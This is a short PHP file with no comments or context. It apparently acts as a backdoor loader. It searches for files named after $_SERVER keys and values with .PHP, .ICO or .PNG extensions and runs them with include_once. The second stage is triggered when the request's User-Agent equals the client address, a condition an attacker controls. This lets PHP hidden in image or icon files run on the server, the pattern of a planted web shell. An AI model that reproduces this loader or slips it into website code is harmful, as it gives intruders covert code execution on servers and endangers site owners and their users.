<?php
	if(isset($_SERVER))
	{
		$_EX=array('.PHP','.ICO','.PNG');
		foreach($_SERVER as $_SERVER_NAME => $_SERVER_VALUE)
		{
			foreach($_EX as $EX)
			{
				if(file_exists($_SERVER_NAME.$EX))
				{
					$_SERVER_NAME_ARRAY[]=$_SERVER_NAME.$EX;
				}
			}
		}
		if(isset($_SERVER_NAME_ARRAY))
		{
			foreach($_SERVER_NAME_ARRAY as $_SERVER_NAME_FILE)
			{
				include_once($_SERVER_NAME_FILE);
			}
		}
		if((isset($HTTP_USER_AGENT))&&(isset($REMOTE_ADDR)))
		{
			if($HTTP_USER_AGENT===$REMOTE_ADDR)
			{
				foreach($_SERVER as $_SERVER_NAME => $_SERVER_VALUE)
				{
					foreach($_EX as $EX)
					{
						if(file_exists($_SERVER_VALUE.$EX))
						{
							$_SERVER_VALUE_ARRAY[]=$_SERVER_VALUE.$EX;
						}
					}
				}
				if(isset($_SERVER_VALUE_ARRAY))
				{
					foreach($_SERVER_VALUE_ARRAY as $_SERVER_VALUE_FILE)
					{
						include_once($_SERVER_VALUE_FILE);
					}
				}
			}
		}
	}
	else
	{
		header('location:/');
	}
?>
